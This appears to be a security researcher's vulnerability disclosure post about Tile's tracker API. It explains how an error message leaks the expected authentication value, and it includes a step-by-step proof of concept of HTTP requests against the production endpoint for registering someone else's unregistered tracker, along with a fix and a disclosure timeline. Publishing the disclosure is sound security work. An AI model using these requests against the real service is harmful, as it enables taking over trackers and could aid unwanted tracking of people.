---
title: 'Tile - Unauthorized Registration of a Genuine Tracker'
publishedAt: '2024-07-05'
description: "Tile, a company selling Bluetooth-based location trackers, has a vulnerability that allows an attacker to register any unregistered Tile tracker to their account. I uncovered this vulnerability during my master's thesis, in which I analyzed the security and privacy of the Tile ecosystem."
tags:
  - security
---

In my master's thesis, I analyzed the security and privacy of large portions of Tile's ecosystem.
During this, I discovered several security vulnerabilities affecting various components and features.
I reported these vulnerabilities to Tile, following [Google Project Zero's responsible disclosure policy](https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html).
However, as the 90-day deadline is over and Tile has failed to respond or patch the issues, I'm publishing my findings in hopes of raising awareness.
This post describes one vulnerability that allows an attacker to register any unregistered Tile tracker to their account.

# Vulnerability

It is possible to register an unregistered Tile tracker to an account without communicating with the tracker.

The endpoint `https://production.tile-api.com/api/v1/tiles/:tileUUID` excepts a valid auth triplet for the device.
An auth triplet consists of the three values `rand_t`, `rand_a`, and `sres_t`.
A valid auth triplet can only be obtained by communicating with a Tile tracker.
However, if the value `sres_t` is incorrect, the endpoint responds with the expected value.
This allows an attacker to bypass this check and add any Tile that is not yet associated with any account without actually communicating with the device.

For the attacker to exploit this vulnerability, they must have knowledge about the Tile UUID of a Tile tracker that is not registered to an account.

# Proof-of-Concept

Before registering a tracker to their account, the attacker needs a valid client UUID and use it to sign in to their account.
The attacker can create a valid client UUID by generating a random UUID and registering it with Tile by sending the following request:
```http
PUT https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7 HTTP/2.0
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
[...]: [...]


registration_timestamp=1720090702959&app_id=android-tile-production&app_version=2.115.0.5050
```

Afterwards, they can sign in to their account with the following request:
```http
POST https://production.tile-api.com/api/v1/clients/c7394030-5b88-44a2-b1be-704b730b07c7/sessions HTTP/2.0
tile_client_uuid: c7394030-5b88-44a2-b1be-704b730b07c7
[...]: [...]

email=********&password=********
```

Next, they can register a Tile tracker with the following request:

```http
POST https://production.tile-api.com/api/v1/tiles/:tileUUID HTTP/2.0
cookie: session=[...]
tile_client_uuid: [...]
content-type: multipart/form-data; boundary=BOUNDARY
[...]: [...]


--BOUNDARY
Content-Disposition: form-data; name="tile_uuid"

:tileUUID
--BOUNDARY
Content-Disposition: form-data; name="rand_a"

AAAAAAAAAAAAAAAAAAAAAA==
--BOUNDARY
Content-Disposition: form-data; name="rand_t"

BBBBBBBBBBBBBBAAAAAAAA==
--BOUNDARY
Content-Disposition: form-data; name="sres_t"

CCCCCC==
--BOUNDARY--
```
_In the request, every instance of `:tileUUID` must be replaced with the Tile UUID of a tracker that is not registered to an account._

In the request above, the auth triplet is incorrect.
The server correctly validates the auth triplet and denies the request.
This should ensure that only a user with physical proximity to the tracker is actually able to register the tracker.
However, the response contains the expected `sres_t` value.

```
Unable to authenticate tile No match sres_t value: calcSresT=1VALID==, sresT=CCCCCC==, randA=AAAAAAAAAAAAAAAAAAAAAA==, randT=BBBBBBBBBBBBBBAAAAAAAA==, tile_uuid=:tileUUID, client_uuid=[...]
```

Using the expected value, it is possible to register the tracker to the attacker's account without ever communicating to the tracker and getting a valid auth triplet.

```http
POST https://production.tile-api.com/api/v1/tiles/:tileUUID HTTP/2.0
cookie: session=[...]
tile_client_uuid: [...]
content-type: multipart/form-data; boundary=BOUNDARY
[...]: [...]

--BOUNDARY
Content-Disposition: form-data; name="tile_uuid"

:tileUUID
--BOUNDARY
Content-Disposition: form-data; name="rand_a"

AAAAAAAAAAAAAAAAAAAAAA==
--BOUNDARY
Content-Disposition: form-data; name="rand_t"

BBBBBBBBBBBBBBAAAAAAAA==
--BOUNDARY
Content-Disposition: form-data; name="sres_t"

1VALID==
--BOUNDARY--
```

# Fix

It is recommended to not leak the `sres_t` value in the error response.

# Timeline

- 2024-03-13: Contacting Life 360's security contact through responsibledisclosure@life360.com
- 2024-05-21: Contacting Tile's support asking for a status update
